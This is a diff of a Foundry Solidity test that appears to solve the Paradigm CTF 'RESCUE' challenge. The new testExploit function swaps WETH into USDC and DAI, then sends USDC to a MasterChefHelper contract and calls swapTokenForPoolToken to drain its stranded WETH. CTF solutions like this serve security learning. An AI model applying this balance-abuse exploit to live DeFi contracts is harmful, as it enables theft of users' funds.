@@ -8,33 +8,46 @@ import "../src/RESCUE/UniswapV2Like.sol";
 import "../src/mocks/ERC20Mock.sol";
 import "../src/mocks/WETH9MOCK.sol";
 
-contract ContractTest is Test {
-    address setupAddress = 0x66d929125dE87064d901fd811625B64A3C5BebeD;
-    Setup public setup = Setup(setupAddress);
-    MasterChefLike public constant masterchef = MasterChefLike(0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd);
-    UniswapV2RouterLike public constant router = UniswapV2RouterLike(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
-    WETH9MOCK public constant weth = WETH9MOCK(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
 
-    uint256 MAX_NUM = 2**256 - 1;
+contract ContractTest is Test {
+
+    Setup public setup = Setup(0x4e4C4FC1e65B71f14F9e09099EF2B45AADe9879f);
+    
+    ERC20Mock weth = ERC20Mock(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    ERC20Mock usdc = ERC20Mock(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
+    ERC20Mock dai = ERC20Mock(0x6B175474E89094C44Da98b954EedeAC495271d0F);
 
     function testExploit() public {
         vm.createSelectFork(vm.rpcUrl("paradigm"));
         MasterChefHelper mcHelper = setup.mcHelper();
+        MasterChefLike masterchef = mcHelper.masterchef();
+        UniswapV2RouterLike router = mcHelper.router();
 
-        ERC20Mock erc20 = new ERC20Mock();
+        usdc.approve(address(router), type(uint256).max);
+        weth.approve(address(router), type(uint256).max);
+        dai.approve(address(router), type(uint256).max);
+        usdc.approve(address(mcHelper), type(uint256).max);
+        weth.approve(address(mcHelper), type(uint256).max);
+        dai.approve(address(mcHelper), type(uint256).max);
 
-        erc20.mint(address(this), 100000000);
-        weth.approve(address(router),10000);
-        erc20.approve(address(router),10000);
+        address(weth).call{value: 1000 ether}(abi.encodeWithSelector(0xd0e30db0));
 
+        uint usdcWethPID = 1;
+        address[] memory path = new address[](2);
+        path[0] = address(weth);
+        path[1] = address(usdc);
 
-        (uint amountA, uint amountB, uint liquidity) = router.addLiquidity(address(erc20),address(weth), 100,0,0,0,address(this), block.timestamp + 1000);
-
-        console.log(amountA);
-        console.log(amountB);
-        console.log(liquidity);
-
+        router.swapExactTokensForTokens(900 ether, 0, path, address(this), block.timestamp+100);
         
+        path[1] = address(dai);
+        router.swapExactTokensForTokens(100 ether, 0, path, address(this), block.timestamp+100);
+
+
+        usdc.transfer(address(mcHelper), usdc.balanceOf(address(this)));
+
+        mcHelper.swapTokenForPoolToken(usdcWethPID, address(dai), 100 ether, 0);
+
+        assertEq(setup.isSolved(), true);
 
     }
 }
